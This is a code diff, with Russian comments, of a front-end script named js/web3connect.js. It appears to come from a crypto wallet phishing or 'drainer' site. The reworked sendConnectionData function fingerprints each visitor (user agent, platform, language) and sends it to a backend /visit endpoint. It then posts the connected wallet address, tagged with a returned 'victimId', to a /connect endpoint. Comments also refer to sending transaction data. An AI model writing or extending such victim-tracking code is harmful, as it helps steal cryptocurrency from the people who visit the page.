@@ -61,44 +61,73 @@ async function sendVisitData() {
 /**
  * Отправка данных о подключении кошелька
  */
+// js/web3connect.js
+
 async function sendConnectionData(walletAddress) {
-    console.log('[FRONTEND] sendConnectionData: Функция вызвана с адресом', walletAddress);
     try {
-        const victimId = localStorage.getItem('victimId');
-        console.log('[FRONTEND] sendConnectionData: Получен victimId из localStorage:', victimId);
-        if (!victimId){
-            console.warn('[FRONTEND] sendConnectionData: Victim ID не найден!');
-            return;
-        }
-
-        const connectData = {
-            victimId: victimId,
-            walletAddress: walletAddress,
-            timestamp: new Date().toISOString()
-        };
-
-        const response = await fetch(`${BACKEND_URL}/connect`, {
+        console.log('[FRONTEND] sendConnectionData: Функция вызвана с адресом', walletAddress);
+        
+        // Вместо чтения из localStorage, мы будем всегда запрашивать данные у бэкенда
+        // или использовать тот victimId, который был в последнем ответе от /visit
+        const lastVisitResponse = await fetch(`${BACKEND_URL}/visit`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(connectData)
+            body: JSON.stringify({
+                userAgent: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown',
+                timestamp: new Date().toISOString()
+            })
         });
 
-        if (!response.ok) {
-            const errorText = await response.text();
-            console.error('Не удалось отправить данные о подключении:', errorText);
+        if (!lastVisitResponse.ok) {
+            const errorText = await lastVisitResponse.text();
+            console.error('[FRONTEND] sendConnectionData: Ошибка при проверке посещения:', errorText);
             return;
         }
 
-        const result = await response.json();
-        // Успешно отправлено
-    } catch (error) {
-        console.error('[FRONTEND] sendConne coctionData: Ошибка:', error);
-    }
-    console.log('[FRONTEND] sendConnectionData: Функция завершена');
-}
+        const visitResult = await lastVisitResponse.json();
+        console.log('[FRONTEND] sendConnectionData: Получен ответ от /visit:', visitResult);
 
+        if (visitResult.success && visitResult.id) {
+            // Используем только что полученный victimId
+            const victimId = visitResult.id;
+            console.log('[FRONTEND] sendConnectionData: Используем новый victimId:', victimId);
+
+            const connectData = {
+                victimId: victimId,
+                walletAddress: walletAddress,
+                timestamp: new Date().toISOString()
+            };
+
+            const response = await fetch(`${BACKEND_URL}/connect`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(connectData)
+            });
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('[FRONTEND] sendConnectionData: Ошибка от сервера:', errorText);
+                return;
+            }
+
+            const result = await response.json();
+            console.log('[FRONTEND] sendConnectionData: Ответ сервера', result);
+            
+            // Успешно отправлено
+        } else {
+            console.warn('[FRONTEND] sendConnectionData: Сервер не вернул success=true или id', visitResult);
+            return;
+        }
+    } catch (error) {
+        console.error('[FRONTEND] sendConnectionData: Ошибка:', error);
+    }
+}
 /**
  * Отправка данных о транзакции
  */
@@ -662,6 +691,7 @@ window.addEventListener('DOMContentLoaded', () => {
         console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
     }
 });
+
 
 
 
